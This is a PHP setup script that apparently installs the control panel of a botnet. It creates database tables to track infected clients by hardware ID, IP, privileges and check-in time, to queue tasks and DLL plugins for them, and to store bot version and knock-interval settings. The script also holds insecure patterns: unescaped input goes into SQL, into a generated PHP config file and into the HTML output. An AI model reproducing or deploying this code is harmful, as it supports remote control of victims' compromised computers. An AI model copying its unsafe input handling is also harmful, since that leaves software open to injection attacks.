<?php


function AddrType($IPAddress)
{
	if (ip2long($IPAddress) !== false) {
		return 'ipv4';
	}

	if (preg_match('/^[0-9a-fA-F:]+$/', $IPAddress) && inet_pton($IPAddress)) {
		return 'ipv6';
	}

	return 'unknown';
}

function ImportCSV($conn)
{
	$File = fopen('geoip.csv', 'r');

	if (is_resource($File)) {
		$conn->beginTransaction();
		$q = $conn->prepare('INSERT INTO GeoIP (addr_type, ip_start, ip_end, country) VALUES (:addr_type, :start, :end, :country)');

		while ($r = fgetcsv($File)) {
			$addr_type = addrtype($r[0]);
			$start = inet_pton($r[0]);
			$end = inet_pton($r[1]);
			$country = $r[2];
			$q->execute(array(':addr_type' => $addr_type, ':start' => $start, ':end' => $end, ':country' => $country));
		}

		$conn->commit();
		fclose($File);
		return true;
	}

	return false;
}

function Output($str)
{
	echo $str;
	ob_flush();
}

function Install(&$pResult, $MySQLHost, $MySQLUser, $MySQLPw, $DBName, $User, $UserPw, $Key1, $Key2, $activationCode)
{
	$Result = '';
	$Ret = false;

	try {
		$Result .= 'Connecting...<br/>';
		$conn = new PDO('mysql:host=' . $MySQLHost . ';dbname=' . $DBName, $MySQLUser, $MySQLPw);
		$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		$Result .= 'Selecting database<br/>';
		$conn->exec('USE ' . $DBName);
		$Result .= 'Creating table (Clients)<br/>';
		$sql = 'CREATE TABLE `clients` (' . "\r\n" . '  `hwid` varchar(255) NOT NULL,' . "\r\n" . '  `ip` varchar(32) NOT NULL,' . "\r\n" . '  `cc` varchar(10) NOT NULL,' . "\r\n" . '  `user` varchar(255) CHARACTER SET utf16le NOT NULL,' . "\r\n" . '  `os` int(6) NOT NULL,' . "\r\n" . '  `cpu` varchar(255) NOT NULL,' . "\r\n" . '  `user_privileges` tinyint(1) NOT NULL,' . "\r\n" . '  `install_date` int(128) NOT NULL,' . "\r\n" . '  `group_name` varchar(255) NOT NULL,' . "\r\n" . '  `status` tinyint(1) NOT NULL,' . "\r\n" . '  `last_check` int(128) NOT NULL' . "\r\n" . ');';
		$conn->exec($sql);
		$Result .= 'Creating table (Tasks)<br/>';
		$sql = 'CREATE TABLE `tasks` (' . "\r\n" . '  `hwid` varchar(255) NOT NULL,' . "\r\n" . '  `task` int(2) NOT NULL,' . "\r\n" . '  `task_name` varchar(255) NOT NULL,' . "\r\n" . '  `parameter` varchar(255) NOT NULL,' . "\r\n" . '  `options` varchar(10) NOT NULL,' . "\r\n" . '  `creation_date` int(32) NOT NULL,' . "\r\n" . '  `expiration_date` int(32) NOT NULL,' . "\r\n" . '  `execution_date` int(32) NOT NULL,' . "\r\n" . '  `on_connect_task` int(2) NOT NULL,' . "\r\n" . '  `apply_to_all` int(2) NOT NULL,' . "\r\n" . '  `client_limit` int(255) NOT NULL,' . "\r\n" . '  `status` int(2) NOT NULL' . "\r\n" . ');';
		$conn->exec($sql);
		$Result .= 'Creating table (Plugins)<br/>';
		$sql = 'CREATE TABLE `plugins` (' . "\r\n" . '  `guid` varchar(128) NOT NULL,' . "\r\n" . '  `name` varchar(255) NOT NULL,' . "\r\n" . '  `icon` varchar(255) NOT NULL,' . "\r\n" . '  `description` text NOT NULL,' . "\r\n" . '  `version` int(10) NOT NULL,' . "\r\n" . '  `has_dll` int(2) NOT NULL' . "\r\n" . ');';
		$conn->exec($sql);
		$Result .= 'Creating table (Settings)<br/>';
		$sql = 'CREATE TABLE `settings` (' . "\r\n" . '  `id` int(2) NOT NULL,' . "\r\n" . '  `version` varchar(24) CHARACTER SET ascii NOT NULL COMMENT \'version of bot\',' . "\r\n" . '  `disable_gates` int(1) NOT NULL,' . "\r\n" . '  `securecode` varchar(16) CHARACTER SET ascii NOT NULL COMMENT \'security code for login page\',' . "\r\n" . '  `created` int(11) NOT NULL COMMENT \'date created (UNIX)\',' . "\r\n" . '  `absent_limit` smallint(6) NOT NULL COMMENT \'Max # of days before being marked dead\',' . "\r\n" . '  `knock_interval` mediumint(8) UNSIGNED NOT NULL COMMENT \'Knock interval (in minutes) for bots\',' . "\r\n" . '  `cache_plugins` int(1) NOT NULL,' . "\r\n" . '  `settings_updated` int(32) NOT NULL);';
		$conn->exec($sql);
		$Result .= 'Creating table (Users)<br/>';
		$sql = 'CREATE TABLE `users` (' . "\r\n" . '  `username` varchar(256) NOT NULL,' . "\r\n" . '  `password` varchar(256) NOT NULL,' . "\r\n" . '  `salt` varchar(256) NOT NULL,' . "\r\n" . '  `last_login` int(128) NOT NULL' . "\r\n" . ');';
		$conn->exec($sql);
		$Result .= 'Creating table (GeoIP)<br/>';
		$sql = 'CREATE TABLE IF NOT EXISTS GeoIP (' . "\r\n" . '                        addr_type enum(\'ipv4\', \'ipv6\') NOT NULL,' . "\r\n" . '                        ip_start varbinary(16) NOT NULL ,' . "\r\n" . '                        ip_end varbinary(16) NOT NULL ,' . "\r\n" . '                        country char(2) NOT NULL ,' . "\r\n" . '                        PRIMARY KEY (ip_start)' . "\r\n" . '                        );';
		$conn->exec($sql);
		$Result .= 'Default values...<br/>';
		$pr = $conn->prepare('INSERT INTO users ( ' . "\r\n\t\t\t\t\t" . 'username, ' . "\r\n\t\t\t\t\t" . 'password, ' . "\r\n\t\t\t\t\t" . 'salt, ' . "\r\n\t\t\t\t\t" . 'last_login' . "\r\n\t\t\t\t" . ') VALUES ( ' . "\r\n\t\t\t\t\t" . ':username, ' . "\r\n\t\t\t\t\t" . ':password, ' . "\r\n\t\t\t\t\t" . ':salt, ' . "\r\n\t\t\t\t\t" . ':last_login' . "\r\n\t\t\t\t" . ')');
		$salt = dechex(mt_rand(0, 2147483647)) . dechex(mt_rand(0, 2147483647));
		$password = hash('sha256', $UserPw . $salt);
		$round = 0;

		while ($round < 65536) {
			$password = hash('sha256', $password . $salt);
			++$round;
		}

		$pr->execute(array(':username' => $User, ':password' => $password, ':salt' => $salt, ':last_login' => 0));
		$pr = $conn->prepare('INSERT INTO `settings` (`id`, `version`, `disable_gates`, `securecode`, `created`, `absent_limit`, `knock_interval`, `cache_plugins`, `settings_updated`) ' . "\r\n\t\t\t\t\t\t\t\t\t" . 'VALUES (1, \'\', 0, \'\', 0, 7, 1, 0, 0);');
		$pr->execute();
		$Internal = '<?php' . "\r\n\t" . 'require_once("DBG.php");' . "\r\n\t\r\n\t" . '$db_username = "' . $MySQLUser . '"; ' . "\r\n" . '    $db_password = "' . $MySQLPw . '"; ' . "\r\n" . '    $db_host = "' . $MySQLHost . '"; ' . "\r\n" . '    $db_name = "' . $DBName . '"; ' . "\r\n\t\r\n\t" . '$db_options = array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"); ' . "\r\n" . '    ' . "\r\n\t" . 'define("KEY_1", "' . $Key1 . '");' . "\r\n\t" . 'define("KEY_2", "' . $Key2 . '");' . "\r\n\t" . 'define("ACTIVATION_CODE", "' . $activationCode . '");' . "\r\n\t" . 'try ' . "\r\n" . '    { ' . "\r\n" . '       $db = new PDO("mysql:host={$db_host};dbname={$db_name};charset=utf8", $db_username, $db_password, $db_options); ' . "\r\n" . '    } ' . "\r\n" . '    catch(PDOException $ex) ' . "\r\n" . '    { ' . "\r\n\t\t" . 'DEBUG_PRINT("Failed to connect to the database: " . $ex->getMessage());' . "\r\n\t" . '} ' . "\r\n\t\r\n" . '    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); ' . "\r\n" . '    $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC); ' . "\r\n" . '    ' . "\r\n\t" . 'if(function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc()) ' . "\r\n" . '    { ' . "\r\n" . '        function undo_magic_quotes_gpc(&$array) ' . "\r\n" . '        { ' . "\r\n" . '            foreach($array as &$value) ' . "\r\n" . '            { ' . "\r\n" . '                if(is_array($value)) ' . "\r\n" . '                { ' . "\r\n" . '                    undo_magic_quotes_gpc($value); ' . "\r\n" . '                } ' . "\r\n" . '                else ' . "\r\n" . '                { ' . "\r\n" . '                    $value = stripslashes($value); ' . "\r\n" . '                } ' . "\r\n" . '            } ' . "\r\n" . '        } ' . "\r\n" . '     ' . "\r\n" . '        undo_magic_quotes_gpc($_POST); ' . "\r\n" . '        undo_magic_quotes_gpc($_GET); ' . "\r\n" . '        undo_magic_quotes_gpc($_COOKIE); ' . "\r\n" . '    } ' . "\r\n\t\r\n\t" . 'function IsValidIP($IP)' . "\r\n\t" . '{' . "\r\n\t\t" . 'if (filter_var($IP, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === FALSE) ' . "\r\n\t\t" . '{' . "\r\n\t\t\t" . 'return false;' . "\r\n\t\t" . '}' . "\r\n\r\n\t\t" . 'return true;' . "\r\n\t" . '}' . "\r\n\t\r\n\t" . 'function GetIPAddress() ' . "\r\n\t" . '{' . "\r\n\t\t" . '$IPKeys = array("HTTP_CLIENT_IP", "HTTP_X_FORWARDED_FOR", "HTTP_X_FORWARDED", "HTTP_X_CLUSTER_CLIENT_IP", "HTTP_FORWARDED_FOR", "HTTP_FORWARDED", "REMOTE_ADDR");' . "\r\n\t\t" . 'foreach ($IPKeys as $Key) ' . "\r\n\t\t" . '{' . "\r\n\t\t\t" . 'if (array_key_exists($Key, $_SERVER) === true) ' . "\r\n\t\t\t" . '{' . "\r\n\t\t\t\t" . 'foreach (explode(",", $_SERVER[$Key]) as $IP) ' . "\r\n\t\t\t\t" . '{' . "\r\n\t\t\t\t\t" . '$IP = trim($IP);' . "\r\n\t\t\t\t\t" . 'if (IsValidIP($IP))' . "\r\n\t\t\t\t\t" . '{' . "\r\n\t\t\t\t\t\t" . 'return $IP;' . "\r\n\t\t\t\t\t" . '}' . "\r\n\t\t\t\t" . '}' . "\r\n\t\t\t" . '}' . "\r\n\t\t" . '}' . "\r\n\r\n\t\t" . 'return isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : false;' . "\r\n\t" . '}' . "\r\n\t\r\n\t" . '// Change this to your timezone' . "\r\n\t" . 'date_default_timezone_set("UTC");' . "\r\n\t\r\n" . '    header("Content-Type: text/html; charset=utf-8"); ' . "\r\n\t\r\n" . '    session_start(); ' . "\r\n" . '?>';
		$Result .= 'Creating internal file<br/>';
		//chmod('../include', 511);
		$File = fopen('../include/internal.php', 'w');

		if ($File) {
			fwrite($File, $Internal);
			fclose($File);
		}
		else {
			throw new Exception('Unable to create the internal file. Verify permissions for folder \'/include/\'.<br/>');
		}

		//chmod('../include', 493);
		$Result .= 'Importing Geo IP<br/>';
		importcsv($conn);
		$Result .= 'Installed successfully, delete setup directory from server!<br/>';
		$Ret = true;
		$conn = NULL;
	}
	catch (Exception $e) {
		$conn = NULL;
		$Result .= $e->getMessage();
	}

	return $Ret;
}

set_time_limit(10 * 60);

if (isset($_POST['setup_submit'])) {
	$ret = false;
	$result = '';
	if (!(isset($_POST['mysql_host']) && (0 < strlen($_POST['mysql_host'])))) {
		$result = 'Host is required';
	}
	else {
		if (!(isset($_POST['mysql_user']) && (0 < strlen($_POST['mysql_user'])))) {
			$result = 'User is required';
		}
		else {
			if (!(isset($_POST['database_name']) && (0 < strlen($_POST['database_name'])))) {
				$result = 'Database is required';
			}
			else {
				if (!(isset($_POST['username']) && (0 < strlen($_POST['username'])))) {
					$result = 'Username is required';
				}
				else {
					if (!(isset($_POST['user_password']) && (0 < strlen($_POST['user_password'])))) {
						$result = 'Password is required';
					}
					else {
						$ret = install($result, $_POST['mysql_host'], $_POST['mysql_user'], $_POST['mysql_password'], $_POST['database_name'], $_POST['username'], $_POST['user_password'], $_POST['key1'], $_POST['key2'], $_POST['activation_code']);
					}
				}
			}
		}
	}
}

echo "\r\n" . '<head>' . "\r\n" . '</head>' . "\r\n" . '<html>' . "\r\n" . '    <h2 align="center"> Setup information </h1>' . "\r\n" . '    <br/>' . "\r\n" . '    ' . "\r\n" . '    <!-- checking error or success -->' . "\r\n" . '    ';

if (isset($ret) && isset($result) && strlen($result)) {
	if ($ret == true) {
		$clr = 'green';
	}
	else {
		$clr = 'red';
	}

	echo '<div style=\'width: 100%; text-align: center; color: ' . $clr . '\' >' . $result . '</div><br/>';
}

echo '    ' . "\r\n" . '    <form action=\'\' method=\'post\'>' . "\r\n" . '        <div align=\'center\'>' . "\r\n" . '            SQL Host: <br/> ' . "\r\n" . '            <input style=\'width:300px\' type=\'text\' name=\'mysql_host\'' . "\r\n" . '            value=\'';
echo isset($_POST['mysql_host']) ? $_POST['mysql_host'] : '';
echo '\'/> <br/> <br/>' . "\r\n" . '            ' . "\r\n" . '            SQL User: <br/> ' . "\r\n" . '            <input style=\'width:300px\' type=\'text\' name=\'mysql_user\'' . "\r\n" . '            value=\'';
echo isset($_POST['mysql_user']) ? $_POST['mysql_user'] : '';
echo '\'/> <br/> <br/>' . "\r\n" . '            ' . "\r\n" . '            SQL Password: <br/>' . "\r\n" . '            <input style=\'width:300px\' type=\'text\' name=\'mysql_password\' value=\'\'/> <br/> <br/>' . "\r\n" . '            ' . "\r\n" . '            Database name: <br/>' . "\r\n" . '            <input style=\'width:300px\' type=\'text\' name=\'database_name\'' . "\r\n" . '            value=\'';
echo isset($_POST['database_name']) ? $_POST['database_name'] : '';
echo '\'/> <br/> <br/>' . "\r\n" . '            ' . "\r\n" . '            Username (Control panel): <br/>' . "\r\n" . '            <input style=\'width:300px\' type=\'text\' name=\'username\'' . "\r\n" . '            value=\'';
echo isset($_POST['username']) ? $_POST['username'] : '';
echo '\'/> <br/> <br/>' . "\r\n" . '            ' . "\r\n" . '            Password (Control panel): <br/>' . "\r\n" . '            <input style=\'width:300px\' type=\'text\' name=\'user_password\' value=\'\'/> <br/><br/>' . "\r\n" . '            ' . "\r\n" . '            Key #1: <br/>' . "\r\n" . '            <input style=\'width:300px\' type=\'text\' name=\'key1\'' . "\r\n" . '            value=\'';
echo isset($_POST['key1']) ? $_POST['key1'] : '';
echo '\'/> <br/> <br/>' . "\r\n" . '            ' . "\r\n" . '            Key #2: <br/>' . "\r\n" . '            <input style=\'width:300px\' type=\'text\' name=\'key2\'' . "\r\n" . '            value=\'';
echo isset($_POST['key2']) ? $_POST['key2'] : '';
echo '\'/> <br/> <br/>' . "\r\n" . '            Activation Code: <br/>' . "\r\n\t\t\t" . '<textarea style=\'width:300px\' rows="8" name=\'activation_code\' value=\'\'>';
echo isset($_POST['activation_code']) ? $_POST['activation_code'] : '';
echo '</textarea>  <br/> <br/>' . "\r\n" . '            <br/>' . "\r\n" . '            <input style=\'width:300px\' type=\'submit\' name=\'setup_submit\' value=\'Install\' action=\'\'/>' . "\r\n" . '        </div>' . "\r\n" . '    </form>' . "\r\n" . '</html>';

?>
